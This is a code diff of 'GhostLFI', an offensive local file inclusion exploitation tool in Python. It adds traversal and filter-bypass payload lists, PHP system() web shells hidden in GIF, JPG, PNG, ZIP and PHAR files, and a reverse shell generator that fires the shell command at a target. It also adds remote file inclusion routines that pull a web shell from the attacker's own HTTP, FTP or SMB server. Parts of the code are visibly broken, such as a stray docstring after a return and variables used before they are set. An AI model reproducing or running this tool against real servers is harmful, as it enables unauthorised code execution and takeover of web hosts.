@@ -2,6 +2,8 @@
 """
 GhostLFI - Local File Inclusion Exploitation Framework
 Ghost Ops Security - The Ultimate All-In-One LFI Tool
+Author: Gh0stsh3ll5619
+https://ghostops-security.com
 
 Everything you need in ONE tool:
 - Payload generation (LFI, wrappers, shells, revshells)
@@ -105,27 +107,104 @@ class UltimateLFIExploiter:
 
 {Fore.YELLOW}[*] Target URL: {Fore.WHITE}{self.target_url}{Style.RESET_ALL}
 {Fore.YELLOW}[*] Parameter:  {Fore.WHITE}{self.parameter}{Style.RESET_ALL}
-{Fore.YELLOW}[*] Version:    {Fore.WHITE}2.0 - Ghost Edition{Style.RESET_ALL}
+{Fore.YELLOW}[*] Version:    {Fore.WHITE}3.7 - URL Encoding Fixed (PHAR/ZIP Working){Style.RESET_ALL}
 """
         print(banner)
 
     # ==================== PAYLOAD GENERATION ====================
     
     def generate_lfi_payloads(self, target_file: str = '/etc/passwd', depth: int = 10) -> Dict[str, str]:
-        """Generate various LFI bypass payloads"""
-        payloads = {
-            'basic': '../' * depth + target_file,
-            'null_byte': '../' * depth + target_file + '%00',
-            'null_byte_ext': '../' * depth + target_file + '%00.jpg',
-            'double_encode': ('..' + '%252f') * depth + target_file,
-            'path_truncation': '../' * depth + target_file + '/' * 2048,
-            'dot_truncation': '../' * depth + target_file + '/.' * 2048,
-            'url_encoded': ('..' + '%2f') * depth + target_file,
-            'double_traversal': ('..../' + '/') * depth + target_file,
-            'backslash': ('..\\') * depth + target_file.replace('/', '\\'),
-            'mixed_encoding': ('%2e%2e%2f') * depth + target_file,
-            'absolute': '/' + target_file,
-        }
+        """Generate various LFI bypass payloads - HTB Academy + PayloadsAllTheThings"""
+        payloads = {}
+        
+        # Basic traversal
+        payloads['basic'] = '../' * depth + target_file
+        
+        # Null byte bypass (PHP < 5.3)
+        payloads['null_byte'] = '../' * depth + target_file + '%00'
+        payloads['null_byte_ext'] = '../' * depth + target_file + '%00.jpg'
+        
+        # Double encoding
+        payloads['double_encode'] = ('..' + '%252f') * depth + target_file
+        
+        # Path truncation (PHP < 5.3)
+        payloads['path_truncation'] = '../' * depth + target_file + '/' * 2048
+        payloads['dot_truncation'] = '../' * depth + target_file + '/.' * 2048
+        
+        # URL encoding
+        payloads['url_encoded'] = ('..' + '%2f') * depth + target_file
+        
+        # Double traversal
+        payloads['double_traversal'] = ('..../' + '/') * depth + target_file
+        payloads['double_dot_slash'] = '....//....//....//....//....//....//....//....//....//....//etc/passwd'
+        
+        # Backslash (Windows)
+        payloads['backslash'] = ('..\\') * depth + target_file.replace('/', '\\')
+        
+        # Mixed encoding
+        payloads['mixed_encoding'] = ('%2e%2e%2f') * depth + target_file
+        
+        # Absolute path
+        payloads['absolute'] = '/' + target_file
+        
+        # PayloadsAllTheThings additions
+        
+        # UTF-8 encoding
+        payloads['utf8_1'] = '..%c0%af' * depth + target_file
+        payloads['utf8_2'] = '..%c1%9c' * depth + target_file
+        
+        # 16-bit Unicode encoding
+        payloads['unicode_1'] = '..%u2216' * depth + target_file
+        payloads['unicode_2'] = '..%u2215' * depth + target_file
+        
+        # Double URL encoding
+        payloads['double_url'] = ('..' + '%252f') * depth + target_file
+        
+        # Bypass "../" filter
+        payloads['bypass_filter_1'] = '..;/' * depth + target_file
+        payloads['bypass_filter_2'] = '..%00/' * depth + target_file
+        payloads['bypass_filter_3'] = '..%0d/' * depth + target_file
+        payloads['bypass_filter_4'] = '..%0a/' * depth + target_file
+        payloads['bypass_filter_5'] = '..%5c' * depth + target_file
+        
+        # Bypass "../" with slash
+        payloads['slash_bypass_1'] = '.././' * depth + target_file
+        payloads['slash_bypass_2'] = '....//' * depth + target_file
+        
+        # Windows specific
+        if 'windows' in target_file.lower() or 'c:' in target_file.lower():
+            payloads['windows_1'] = '..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
+            payloads['windows_2'] = '....\\\\....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts'
+        
+        # PHP wrappers bypass
+        payloads['filter_convert'] = f'php://filter/convert.base64-encode/resource={target_file}'
+        payloads['filter_string'] = f'php://filter/string.rot13/resource={target_file}'
+        payloads['filter_zlib'] = f'php://filter/zlib.deflate/resource={target_file}'
+        
+        # Zip wrapper
+        payloads['zip_wrapper'] = f'zip://shell.zip%23shell.php'
+        
+        # Phar wrapper
+        payloads['phar_wrapper'] = f'phar://shell.phar/shell.php'
+        
+        # Expect wrapper (if enabled)
+        payloads['expect_id'] = 'expect://id'
+        payloads['expect_whoami'] = 'expect://whoami'
+        
+        # Data wrapper
+        payloads['data_base64'] = 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+'
+        payloads['data_plain'] = 'data://text/plain,<?php system($_GET["cmd"]); ?>'
+        
+        # Input wrapper
+        payloads['php_input'] = 'php://input'
+        
+        # PayloadsAllTheThings - Filter chains
+        payloads['filter_chain_1'] = 'php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.base64-decode|convert.base64-encode|convert.iconv.UTF-8.UTF7|convert.base64-decode/resource=index.php'
+        
+        # Case variation (bypass case-sensitive filters)
+        payloads['case_variation_1'] = '../' * depth + 'ETc/PASSwd'
+        payloads['case_variation_2'] = '../' * depth + 'eTc/pAsSwD'
+        
         return payloads
     
     def generate_wrapper_payloads(self, command: str = "id") -> Dict[str, any]:
@@ -170,6 +249,58 @@ class UltimateLFIExploiter:
             'ruby': f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
         }
         return shells
+    
+    def generate_reverse_shell(self):
+        """Interactive reverse shell generator"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[REVERSE SHELL GENERATOR]")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        lhost = input(f"{Fore.YELLOW}Enter your IP (LHOST): {Style.RESET_ALL}").strip()
+        lport = input(f"{Fore.YELLOW}Enter your port (LPORT) [4444]: {Style.RESET_ALL}").strip() or '4444'
+        
+        try:
+            lport = int(lport)
+        except:
+            lport = 4444
+        
+        shells = self.generate_reverse_shells(lhost, lport)
+        
+        print(f"\n{Fore.GREEN}[✓] Generated reverse shell payloads:{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[*] Start listener first:{Style.RESET_ALL}")
+        print(f"    nc -lvnp {lport}")
+        
+        print(f"\n{Fore.CYAN}Available shells:{Style.RESET_ALL}")
+        for i, (name, cmd) in enumerate(shells.items(), 1):
+            print(f"  {i}. {name}")
+        
+        choice = input(f"\n{Fore.YELLOW}Select shell [1-{len(shells)}]: {Style.RESET_ALL}").strip()
+        
+        try:
+            choice = int(choice)
+            if 1 <= choice <= len(shells):
+                shell_name = list(shells.keys())[choice - 1]
+                shell_cmd = shells[shell_name]
+                
+                print(f"\n{Fore.GREEN}[✓] Selected: {shell_name}{Style.RESET_ALL}")
+                print(f"\n{Fore.CYAN}Execute this command on target:{Style.RESET_ALL}")
+                print(f"{Fore.WHITE}{shell_cmd}{Style.RESET_ALL}")
+                
+                # Try to execute via RCE
+                if hasattr(self, 'lfi_payload'):
+                    print(f"\n{Fore.YELLOW}[*] Attempting to execute via RCE...{Style.RESET_ALL}")
+                    full_url = f"{self.target_url}?{self.parameter}={self.lfi_payload}&cmd={urllib.parse.quote(shell_cmd)}"
+                    print(f"{Fore.CYAN}[*] URL: {full_url}{Style.RESET_ALL}")
+                    
+                    try:
+                        self.session.get(full_url, timeout=3, proxies=self.proxy)
+                    except:
+                        pass
+                    
+                    print(f"{Fore.GREEN}[✓] Payload sent! Check your listener.{Style.RESET_ALL}")
+                
+        except:
+            print(f"{Fore.RED}[✗] Invalid selection{Style.RESET_ALL}")
     
     def encode_payload(self, payload: str) -> Dict[str, str]:
         """Encode payload in various formats"""
@@ -444,7 +575,1008 @@ class UltimateLFIExploiter:
         print(f"{Fore.RED}[✗] php://input wrapper not working{Style.RESET_ALL}")
         return False
 
-    # ==================== LOG POISONING ====================
+    # ==================== RFI TESTING ====================
+    
+    def test_rfi_vulnerability(self) -> bool:
+        """Test for Remote File Inclusion (RFI) vulnerability"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[PHASE 3.4] Testing RFI (Remote File Inclusion)")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        if not self.config_status.get('allow_url_include'):
+            print(f"{Fore.YELLOW}[!] allow_url_include not enabled (required for RFI){Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[*] Testing anyway (may work with SMB on Windows)...{Style.RESET_ALL}")
+        
+        # Test 1: Include local URL (SSRF test)
+        print(f"{Fore.YELLOW}[*] Testing RFI with local URL (SSRF)...{Style.RESET_ALL}")
+        try:
+            payload = 'http://127.0.0.1:80/index.php'
+            response = self._send_payload(payload, timeout=5)
+            
+            # Check if we got content (not just error)
+            if len(response.text) > 100 and response.status_code == 200:
+                print(f"{Fore.GREEN}[✓] RFI vulnerability confirmed!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}    Can include remote URLs (SSRF possible){Style.RESET_ALL}")
+                self.successful_methods.append('RFI/SSRF')
+                return True
+        except:
+            pass
+        
+        print(f"{Fore.YELLOW}[!] Could not confirm RFI with local URL{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] RFI may still work with hosted files...{Style.RESET_ALL}")
+        return False
+    
+    def test_rfi_http(self, lhost: str, lport: int = 8000) -> bool:
+        """Test RFI with HTTP protocol"""
+        print(f"\n{Fore.CYAN}[RFI-HTTP] Testing HTTP-based RFI{Style.RESET_ALL}")
+        
+        # Create shell file
+        shell_content = '<?php system($_GET["cmd"]); ?>'
+        shell_path = '/tmp/ghostlfi_shell.php'
+        
+        try:
+            with open(shell_path, 'w') as f:
+                f.write(shell_content)
+            
+            print(f"{Fore.YELLOW}[*] Created shell at: {shell_path}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[*] Start HTTP server: sudo python3 -m http.server {lport}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[*] Then include: http://{lhost}:{lport}/ghostlfi_shell.php&cmd=id{Style.RESET_ALL}")
+            
+            # Generate payload
+            payload = f'http://{lhost}:{lport}/ghostlfi_shell.php'
+            
+            print(f"{Fore.CYAN}[+] RFI HTTP Payload: {payload}&cmd=id{Style.RESET_ALL}")
+            return True
+            
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Failed to prepare HTTP RFI: {str(e)}{Style.RESET_ALL}")
+            return False
+    
+    def test_rfi_ftp(self, lhost: str, lport: int = 21) -> bool:
+        """Test RFI with FTP protocol"""
+        print(f"\n{Fore.CYAN}[RFI-FTP] Testing FTP-based RFI{Style.RESET_ALL}")
+        
+        print(f"{Fore.YELLOW}[*] FTP may bypass HTTP restrictions{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Start FTP server: sudo python -m pyftpdlib -p {lport}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Place shell.php in current directory{Style.RESET_ALL}")
+        
+        # Generate payload
+        payload = f'ftp://{lhost}:{lport}/ghostlfi_shell.php'
+        
+        print(f"{Fore.CYAN}[+] RFI FTP Payload: {payload}&cmd=id{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[+] With auth: ftp://user:pass@{lhost}:{lport}/ghostlfi_shell.php&cmd=id{Style.RESET_ALL}")
+        
+        return True
+    
+    def exploit_rfi_auto(self, lhost: str, protocol: str = 'http', lport: int = None) -> bool:
+        """Automatically exploit RFI if possible"""
+        print(f"\n{Fore.CYAN}[RFI AUTO-EXPLOIT] Attempting automatic RFI exploitation{Style.RESET_ALL}")
+        
+        # Set default port
+        if not lport:
+            if protocol == 'http':
+                lport = 8000
+            elif protocol == 'ftp':
+                lport = 21
+        
+        # Create shell
+        shell_content = '<?php system($_GET["cmd"]); ?>'
+        shell_path = '/tmp/ghostlfi_shell.php'
+        
+        try:
+            with open(shell_path, 'w') as f:
+                f.write(shell_content)
+            print(f"{Fore.GREEN}[✓] Created shell: {shell_path}{Style.RESET_ALL}")
+        except:
+            print(f"{Fore.RED}[✗] Could not create shell{Style.RESET_ALL}")
+            return False
+        
+        # Construct RFI payload
+        from urllib.parse import urlparse
+        parsed = urlparse(self.target_url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        
+        if protocol == 'http':
+            rfi_payload = f'http://{lhost}:{lport}/ghostlfi_shell.php'
+        elif protocol == 'ftp':
+            rfi_payload = f'ftp://{lhost}:{lport}/ghostlfi_shell.php'
+        elif protocol == 'smb':
+            rfi_payload = f'\\\\{lhost}\\share\\ghostlfi_shell.php'
+        else:
+            print(f"{Fore.RED}[✗] Unknown protocol{Style.RESET_ALL}")
+            return False
+        
+        print(f"{Fore.YELLOW}[*] Testing RFI with {protocol.upper()}...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Make sure your server is running!{Style.RESET_ALL}")
+        
+        # Test command execution
+        try:
+            full_url = f'{base_url}?{self.parameter}={urllib.parse.quote(rfi_payload)}&cmd=id'
+            print(f"{Fore.CYAN}[*] Testing: {full_url}{Style.RESET_ALL}")
+            
+            response = self.session.get(full_url, proxies=self.proxy, timeout=10)
+            
+            if 'uid=' in response.text and 'gid=' in response.text:
+                print(f"{Fore.GREEN}[✓] RFI exploitation successful!{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}    Output: {response.text[:200]}...{Style.RESET_ALL}")
+                self.rce_method = f'rfi_{protocol}'
+                self.successful_methods.append(f'RFI-{protocol.upper()}')
+                return True
+            else:
+                print(f"{Fore.YELLOW}[!] Command might have executed but output not visible{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Check your server logs{Style.RESET_ALL}")
+                return False
+                
+        except Exception as e:
+            print(f"{Fore.RED}[✗] RFI test failed: {str(e)}{Style.RESET_ALL}")
+            return False
+        """Test RFI with SMB protocol (Windows targets)"""
+        print(f"\n{Fore.CYAN}[RFI-SMB] Testing SMB-based RFI (Windows){Style.RESET_ALL}")
+        
+        print(f"{Fore.YELLOW}[*] SMB works on Windows without allow_url_include!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Start SMB server: impacket-smbserver -smb2support share $(pwd){Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Place shell.php in current directory{Style.RESET_ALL}")
+        
+        # Generate UNC path payloads
+        payload = f'\\\\{lhost}\\share\\ghostlfi_shell.php'
+        
+        print(f"{Fore.CYAN}[+] RFI SMB Payload (UNC): {payload}&cmd=whoami{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[!] Note: SMB works best on same network{Style.RESET_ALL}")
+        
+        return True
+    
+    def setup_rfi_server(self, protocol: str = 'http', lhost: str = None, lport: int = None) -> bool:
+        """Setup RFI server and provide instructions"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[RFI SETUP] Remote File Inclusion Server Setup")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        if not lhost:
+            lhost = input(f"{Fore.YELLOW}Enter your IP address: {Style.RESET_ALL}")
+        
+        # Create malicious shell
+        shell_content = '<?php system($_GET["cmd"]); ?>'
+        shell_path = '/tmp/ghostlfi_shell.php'
+        
+        try:
+            with open(shell_path, 'w') as f:
+                f.write(shell_content)
+            print(f"{Fore.GREEN}[✓] Created shell: {shell_path}{Style.RESET_ALL}")
+        except:
+            print(f"{Fore.RED}[✗] Could not create shell file{Style.RESET_ALL}")
+        
+        # Parse target URL - extract base without query params
+        from urllib.parse import urlparse, parse_qs
+        parsed = urlparse(self.target_url)
+        # Get base URL without any query parameters
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        
+        if protocol == 'http':
+            if not lport:
+                lport = 8000
+            print(f"\n{Fore.YELLOW}[STEP 1] Start HTTP Server:{Style.RESET_ALL}")
+            print(f"  cd /tmp && sudo python3 -m http.server {lport}")
+            
+            rfi_payload = f'http://{lhost}:{lport}/ghostlfi_shell.php'
+            
+            print(f"\n{Fore.YELLOW}[STEP 2] Include Remote Shell:{Style.RESET_ALL}")
+            print(f"  {base_url}?{self.parameter}={rfi_payload}&cmd=id")
+            
+            print(f"\n{Fore.YELLOW}[STEP 3] Execute Commands:{Style.RESET_ALL}")
+            print(f"  Change &cmd=id to any command")
+            
+            print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
+            print(f"  curl '{base_url}?{self.parameter}={rfi_payload}&cmd=id'")
+            
+        elif protocol == 'ftp':
+            if not lport:
+                lport = 21
+            print(f"\n{Fore.YELLOW}[STEP 1] Install pyftpdlib:{Style.RESET_ALL}")
+            print(f"  sudo pip3 install pyftpdlib")
+            
+            print(f"\n{Fore.YELLOW}[STEP 2] Start FTP Server:{Style.RESET_ALL}")
+            print(f"  cd /tmp && sudo python -m pyftpdlib -p {lport}")
+            
+            rfi_payload = f'ftp://{lhost}:{lport}/ghostlfi_shell.php'
+            
+            print(f"\n{Fore.YELLOW}[STEP 3] Include Remote Shell:{Style.RESET_ALL}")
+            print(f"  {base_url}?{self.parameter}={rfi_payload}&cmd=id")
+            
+            print(f"\n{Fore.YELLOW}[STEP 4] With Authentication (if needed):{Style.RESET_ALL}")
+            rfi_payload_auth = f'ftp://user:pass@{lhost}:{lport}/ghostlfi_shell.php'
+            print(f"  {base_url}?{self.parameter}={rfi_payload_auth}&cmd=id")
+            
+            print(f"\n{Fore.CYAN}[CURL COMMAND]{Style.RESET_ALL}")
+            print(f"  curl '{base_url}?{self.parameter}={rfi_payload}&cmd=id'")
+            
+        elif protocol == 'smb':
+            print(f"\n{Fore.YELLOW}[STEP 1] Install Impacket:{Style.RESET_ALL}")
+            print(f"  sudo pip3 install impacket")
+            
+            print(f"\n{Fore.YELLOW}[STEP 2] Start SMB Server:{Style.RESET_ALL}")
+            print(f"  cd /tmp && impacket-smbserver -smb2support share $(pwd)")
+            
+            # UNC path for Windows
+            unc_payload = f'\\\\\\\\{lhost}\\\\share\\\\ghostlfi_shell.php'
+            
+            print(f"\n{Fore.YELLOW}[STEP 3] Include Remote Shell (UNC Path):{Style.RESET_ALL}")
+            print(f"  {base_url}?{self.parameter}={unc_payload}&cmd=whoami")
+            
+            print(f"\n{Fore.CYAN}[CURL COMMAND - URL Encoded]{Style.RESET_ALL}")
+            # URL encode the backslashes
+            unc_encoded = urllib.parse.quote(f'\\\\{lhost}\\share\\ghostlfi_shell.php')
+            print(f"  curl '{base_url}?{self.parameter}={unc_encoded}&cmd=whoami'")
+            
+            print(f"\n{Fore.CYAN}[BROWSER URL]{Style.RESET_ALL}")
+            print(f"  {base_url}?{self.parameter}=\\\\{lhost}\\share\\ghostlfi_shell.php&cmd=whoami")
+            
+            print(f"\n{Fore.GREEN}[!] SMB works on Windows without allow_url_include!{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[!] Best results on same network{Style.RESET_ALL}")
+        
+        return True
+    
+    
+    # ==================== FILE UPLOAD EXPLOITATION ====================
+    
+    def detect_upload_forms(self) -> list:
+        """Detect file upload forms on the target"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FILE UPLOAD DETECTION] Scanning for Upload Forms")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        upload_forms = []
+        
+        try:
+            # Get the main page
+            response = self.session.get(self.target_url, proxies=self.proxy, timeout=10)
+            
+            # Look for file upload forms
+            import re
+            
+            # Find input type="file"
+            file_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*>', response.text, re.IGNORECASE)
+            
+            # Find form tags with enctype
+            upload_forms_html = re.findall(r'<form[^>]*enctype=["\']multipart/form-data["\'][^>]*>.*?</form>', response.text, re.IGNORECASE | re.DOTALL)
+            
+            if file_inputs or upload_forms_html:
+                print(f"{Fore.GREEN}[✓] Found {len(file_inputs)} file upload input(s)!{Style.RESET_ALL}")
+                
+                # Extract form action URLs
+                for form in upload_forms_html:
+                    action = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
+                    if action:
+                        upload_forms.append(action.group(1))
+                        print(f"{Fore.GREEN}    Form action: {action.group(1)}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}[!] No file upload forms detected on main page{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[*] Check for upload forms in:{Style.RESET_ALL}")
+                print(f"    - Profile/Settings pages")
+                print(f"    - Admin panels")
+                print(f"    - User dashboard")
+            
+        except requests.exceptions.ConnectionError as e:
+            print(f"{Fore.RED}[✗] CONNECTION FAILED: Cannot reach target!{Style.RESET_ALL}")
+            print(f"{Fore.RED}    {str(e).split(':')[0]}{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[!] Check if target is reachable:{Style.RESET_ALL}")
+            print(f"    1. Verify target URL is correct")
+            print(f"    2. Check if target is still running")
+            print(f"    3. Test connection: curl {self.target_url}")
+            # Re-raise to stop execution
+            raise
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Failed to detect upload forms: {str(e)}{Style.RESET_ALL}")
+            # Re-raise to stop execution for any error
+            raise
+        
+        return upload_forms
+    
+    def generate_image_shell(self, image_type: str = 'gif') -> tuple:
+        """Generate malicious image with PHP code"""
+        shells = {
+            'gif': ('GIF8<?php system($_GET["cmd"]); ?>', 'shell.gif'),
+            'jpg': ('\\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>', 'shell.jpg'),
+            'png': ('\\x89PNG\\r\\n\\x1a\\n<?php system($_GET["cmd"]); ?>', 'shell.png'),
+        }
+        
+        if image_type not in shells:
+            image_type = 'gif'
+        
+        return shells[image_type]
+    
+    def create_malicious_images(self) -> None:
+        """Create all malicious image types"""
+        print(f"\n{Fore.CYAN}[CREATE SHELLS] Creating malicious images...{Style.RESET_ALL}")
+        
+        images = {
+            'GIF': ('GIF8<?php system($_GET["cmd"]); ?>', '/tmp/shell.gif'),
+            'JPG': ('\\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>', '/tmp/shell.jpg'),
+            'PNG': ('\\x89PNG\\r\\n\\x1a\\n<?php system($_GET["cmd"]); ?>', '/tmp/shell.png'),
+        }
+        
+        for img_type, (content, filepath) in images.items():
+            try:
+                with open(filepath, 'w') as f:
+                    f.write(content)
+                print(f"{Fore.GREEN}[✓] Created {img_type}: {filepath}{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[✗] Failed to create {img_type}: {str(e)}{Style.RESET_ALL}")
+    
+    def generate_zip_shell(self) -> str:
+        """Generate ZIP archive with PHP shell"""
+        import zipfile
+        import tempfile
+        
+        shell_content = '<?php system($_GET["cmd"]); ?>'
+        zip_path = '/tmp/shell.jpg'
+        
+        try:
+            # Create temp PHP file
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
+                f.write(shell_content)
+                php_file = f.name
+            
+            # Create ZIP archive
+            with zipfile.ZipFile(zip_path, 'w') as zipf:
+                zipf.write(php_file, 'shell.php')
+            
+            import os
+            os.unlink(php_file)
+            
+            print(f"{Fore.GREEN}[✓] Created ZIP shell: {zip_path}{Style.RESET_ALL}")
+            return zip_path
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Failed to create ZIP: {str(e)}{Style.RESET_ALL}")
+            return None
+    
+    def generate_phar_shell(self) -> str:
+        """Generate PHAR archive with PHP shell"""
+        phar_script = '''<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+?>'''
+        
+        try:
+            # Write script
+            with open('/tmp/create_phar.php', 'w') as f:
+                f.write(phar_script)
+            
+            # Execute to create PHAR
+            import subprocess
+            result = subprocess.run(
+                ['php', '--define', 'phar.readonly=0', '/tmp/create_phar.php'],
+                cwd='/tmp',
+                capture_output=True,
+                text=True
+            )
+            
+            if result.returncode == 0:
+                # Rename to .jpg
+                import os
+                if os.path.exists('/tmp/shell.phar'):
+                    os.rename('/tmp/shell.phar', '/tmp/shell.jpg')
+                    print(f"{Fore.GREEN}[✓] Created PHAR shell: /tmp/shell.jpg{Style.RESET_ALL}")
+                    return '/tmp/shell.jpg'
+            else:
+                print(f"{Fore.YELLOW}[!] PHAR creation requires PHP CLI{Style.RESET_ALL}")
+                return None
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Failed to create PHAR: {str(e)}{Style.RESET_ALL}")
+            return None
+    
+    def test_file_upload_exploitation(self, upload_path: str = None) -> bool:
+        """Complete file upload + LFI exploitation workflow with interactive testing"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FILE UPLOAD + LFI] Complete Exploitation Guide")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        # Step 1: Detect upload forms
+        print(f"\n{Fore.CYAN}[STEP 1] Detecting upload forms...{Style.RESET_ALL}")
+        try:
+            upload_forms = self.detect_upload_forms()
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
+            print(f"\n{Fore.RED}[✗] ABORTING: Cannot connect to target{Style.RESET_ALL}")
+            print(f"{Fore.RED}    Target may be offline or unreachable{Style.RESET_ALL}")
+            # Restore original URL and exit
+            self.target_url = original_url
+            self.parameter = original_param
+            return False
+        except Exception as e:
+            print(f"\n{Fore.RED}[✗] ERROR: {str(e)}{Style.RESET_ALL}")
+            # Restore original URL and exit
+            self.target_url = original_url
+            self.parameter = original_param
+            return False
+        
+        # Check if we need different endpoint for LFI testing
+        print(f"\n{Fore.YELLOW}[IMPORTANT] File upload and LFI may be on different pages!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Current target: {self.target_url}{Style.RESET_ALL}")
+        
+        different_page = input(f"{Fore.YELLOW}Is the LFI vulnerability on a different page? [y/N]: {Style.RESET_ALL}").strip().lower()
+        
+        original_url = self.target_url
+        original_param = self.parameter
+        
+        if different_page == 'y':
+            print(f"\n{Fore.CYAN}[*] Enter the page with LFI vulnerability:{Style.RESET_ALL}")
+            print(f"    Example: If upload is at /settings.php")
+            print(f"             but LFI is at /index.php?language=")
+            print(f"    Enter: http://target.com/index.php  (just the page, no parameters)")
+            
+            lfi_url = input(f"{Fore.YELLOW}LFI page URL: {Style.RESET_ALL}").strip()
+            
+            # Strip any existing query parameters from LFI URL
+            if '?' in lfi_url:
+                lfi_url = lfi_url.split('?')[0]
+                print(f"{Fore.YELLOW}[*] Stripped query params, using: {lfi_url}{Style.RESET_ALL}")
+            
+            lfi_param = input(f"{Fore.YELLOW}LFI vulnerable parameter (e.g., language, page, file): {Style.RESET_ALL}").strip()
+            
+            # Strip equals sign if user included it
+            if lfi_param.endswith('='):
+                lfi_param = lfi_param.rstrip('=')
+                print(f"{Fore.YELLOW}[*] Stripped '=', using parameter: {lfi_param}{Style.RESET_ALL}")
+            
+            # Use 'language' as default if nothing entered
+            if not lfi_param:
+                lfi_param = 'language'
+            
+            if lfi_url:
+                self.target_url = lfi_url
+                self.parameter = lfi_param
+                print(f"{Fore.GREEN}[✓] Will test file inclusion at: {self.target_url}?{self.parameter}={Style.RESET_ALL}")
+        
+        # Step 2: Create malicious files
+        print(f"\n{Fore.CYAN}[STEP 2] Creating malicious files...{Style.RESET_ALL}")
+        self.create_malicious_images()
+        
+        # Create ZIP wrapper
+        print(f"\n{Fore.CYAN}[METHOD 2] ZIP Wrapper{Style.RESET_ALL}")
+        self.generate_zip_shell()
+        
+        # Create PHAR wrapper
+        print(f"\n{Fore.CYAN}[METHOD 3] PHAR Wrapper{Style.RESET_ALL}")
+        self.generate_phar_shell()
+        
+        # Get upload path
+        if not upload_path:
+            print(f"\n{Fore.YELLOW}[*] Common upload paths:{Style.RESET_ALL}")
+            print(f"  - ./uploads/")
+            print(f"  - ./profile_images/")
+            print(f"  - ./files/")
+            print(f"  - ./images/")
+            print(f"  - ./assets/uploads/")
+            upload_path = './uploads/'
+        
+        # Provide exploitation guide
+        self._show_file_upload_guide(upload_path)
+        
+        # Interactive menu
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[INTERACTIVE MODE] Choose exploitation method")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.GREEN}Available methods:{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}1{Style.RESET_ALL} - Malicious GIF (Most reliable)")
+        print(f"  {Fore.CYAN}2{Style.RESET_ALL} - Malicious JPG")
+        print(f"  {Fore.CYAN}3{Style.RESET_ALL} - Malicious PNG")
+        print(f"  {Fore.CYAN}4{Style.RESET_ALL} - ZIP Wrapper (zip://)")
+        print(f"  {Fore.CYAN}5{Style.RESET_ALL} - PHAR Wrapper (phar://)")
+        print(f"  {Fore.CYAN}6{Style.RESET_ALL} - Try all methods automatically")
+        print(f"  {Fore.CYAN}0{Style.RESET_ALL} - Skip testing")
+        
+        try:
+            choice = input(f"\n{Fore.YELLOW}Select method [1-6, 0 to skip]: {Style.RESET_ALL}").strip()
+            
+            if choice == '0':
+                print(f"{Fore.YELLOW}[*] Skipping automatic testing{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[*] Files are ready in /tmp/ for manual upload{Style.RESET_ALL}")
+                # Restore original URL
+                self.target_url = original_url
+                self.parameter = original_param
+                return False
+            
+            # Ask about file upload
+            print(f"\n{Fore.YELLOW}[!] IMPORTANT: You need to upload the file first!{Style.RESET_ALL}")
+            if different_page == 'y':
+                print(f"{Fore.YELLOW}[!] Upload at: {original_url}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Will test inclusion at: {self.target_url}?{self.parameter}={Style.RESET_ALL}")
+            
